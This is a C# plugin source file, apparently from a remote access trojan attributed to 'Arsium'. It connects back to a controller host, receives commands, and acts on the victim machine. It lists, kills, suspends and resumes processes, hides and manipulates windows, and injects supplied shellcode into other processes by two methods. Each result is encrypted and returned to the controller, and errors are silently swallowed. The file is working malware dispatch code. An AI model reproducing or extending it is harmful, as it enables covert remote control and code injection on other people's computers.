using Shared;
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public async static Task Main(Host H, string HWID, object[] Param, Socket Base, string key, string BaseIP)
        {
            try 
            {
                Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                S.Connect(ep);
                PacketType T = (PacketType)Param[0];
                Data D = new Data();
                D.HWID = HWID;
                D.IP_Origin = BaseIP;
                switch (T)
                    {
                    case PacketType.GET_PROC:
                        await Task.Run(() => Functions.GetProcesses(ref D));
                        D.Type = PacketType.GET_PROC;
                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketType.KILL_PROC:
                        bool killed = await Task.Run(() => Functions.KillProcess(int.Parse(Param[1].ToString())));
                        D.Type = PacketType.KILL_PROC;
                        D.DataReturn = new object[] { killed, Param[1].ToString() };
                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketType.RESUME_PROC:
                        bool resumed = await Task.Run(() => Functions.ResumeProcess(int.Parse(Param[1].ToString())));
                        D.Type = PacketType.RESUME_PROC;
                        D.DataReturn = new object[] { resumed, Param[1].ToString() };
                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketType.SUSPEND_PROC:
                        bool suspended = await Task.Run(() => Functions.SuspendProcess(int.Parse(Param[1].ToString())));
                        D.Type = PacketType.SUSPEND_PROC;
                        D.DataReturn = new object[] { suspended, Param[1].ToString() };
                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketType.SET_WND_TEXT:
                        bool settext = await Task.Run(() => Functions.SetWindowsText(int.Parse(Param[1].ToString()), Param[2].ToString()));
                        D.Type = PacketType.SET_WND_TEXT;
                        D.DataReturn = new object[] { settext, Param[1].ToString(), Param[2].ToString() };
                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketType.MAXIMIZE_WND:
                        await Task.Run(() => Functions.MaximizeWindow(int.Parse(Param[1].ToString())));
                        break;

                    case PacketType.MINIMZE_WND:
                        await Task.Run(() => Functions.MinimizeWindow(int.Parse(Param[1].ToString())));
                        break;

                    case PacketType.HIDE_WND:
                        await Task.Run(() => Functions.HideWindow((IntPtr)Param[1]));
                        break;

                    case PacketType.SHOW_WND:
                        await Task.Run(() => Functions.ShowWindow((IntPtr)Param[1]));
                        break;

                    case PacketType.INJECT_CLASSIC_METHOD:
                        await Task.Run(() => Functions.InjectShellCodeClassicMethod(int.Parse(Param[1].ToString()), (byte[])Param[2]));
                        break;

                    case PacketType.INJECT_MAP_VIEW_SECTION:
                        await Task.Run(() => Functions.InjectShellCodeMapView(int.Parse(Param[1].ToString()), (byte[])Param[2]));
                        break;

                }
                    S.Close();
                    S.Dispose();
            }
            catch {}
            finally
            {
                Shared.Utils.ClearMem();
            }
        }
    }
}
